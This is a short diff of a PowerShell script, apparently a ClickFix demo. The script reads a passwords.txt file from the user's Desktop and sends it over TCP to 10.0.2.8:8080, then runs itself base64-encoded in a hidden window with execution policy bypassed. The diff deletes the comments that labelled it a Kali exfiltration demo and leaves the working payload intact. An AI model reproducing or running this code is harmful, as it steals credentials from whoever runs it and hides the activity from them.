@@ -1,4 +1,3 @@
-# Decoded intent: Connects to Kali machine, sends the file content, and stays 'open' to mimic a shell.
 $command = {
     $ip = "10.0.2.8"; $port = 8080
     $content = Get-Content "$home\Desktop\passwords.txt"
@@ -12,7 +11,6 @@ $command = {
     $client.Close()
 }
 
-# To run as a ClickFix demo, use this encoded version:
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command.ToString())
 $encoded = [Convert]::ToBase64String($bytes)
 powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded
